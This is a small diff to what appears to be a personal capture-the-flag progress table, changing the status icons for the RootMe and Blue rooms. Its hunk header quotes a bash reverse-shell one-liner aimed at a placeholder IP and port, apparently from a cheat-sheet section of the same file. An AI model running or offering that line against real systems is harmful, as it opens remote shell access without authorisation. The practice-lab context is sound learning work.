@@ -265,9 +265,9 @@ bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 |-----------------|------------|-------------|--------|
 | Ignite          | Web        | Easy        | 🟩     |
 | Startup         | Linux      | Easy        | 🟩     |
-| RootMe          | Web        | Easy        | ⬜     |
+| RootMe          | Web        | Easy        | 🟨     |
 | Blog WordPress  | Web        | Easy        | ⬜     |
-| Blue            | Windows    | Easy        | 🟩     |
+| Blue            | Windows    | Easy        | 🟨     |
 | Blueprint       | Windows    | Easy        | ⬜     |
 
 ---
